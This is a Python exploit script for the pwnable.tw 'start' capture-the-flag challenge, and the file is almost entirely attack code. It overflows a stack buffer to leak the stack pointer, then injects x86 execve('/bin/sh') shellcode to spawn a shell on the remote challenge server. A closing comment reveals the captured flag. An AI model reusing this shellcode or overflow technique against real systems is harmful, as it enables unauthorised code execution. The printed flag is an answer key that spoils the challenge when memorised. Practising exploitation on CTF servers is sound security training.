import struct
import sys
import socket
import telnetlib

# SERVER = ('127.0.0.1', 2323)
SERVER = ('chall.pwnable.tw', 10000)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)
s.recv(1024)

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

# leak stack address
payload = b''
payload += b'a' * 0x14

# 0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
payload += struct.pack('<I', 0x08048087)
s.send(payload)
data = s.recv(1024)
data = data[:4]
esp = struct.unpack('<I', data)[0]
print('[+] Leaked esp: {}'.format(hex(esp)))


# /bin/sh execve shellcode
payload = b''
payload = b'a' * 0x14
payload += struct.pack('<I', esp + 0x14)
payload += shellcode

s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()

'''
$ cat /home/start/flag
FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
'''
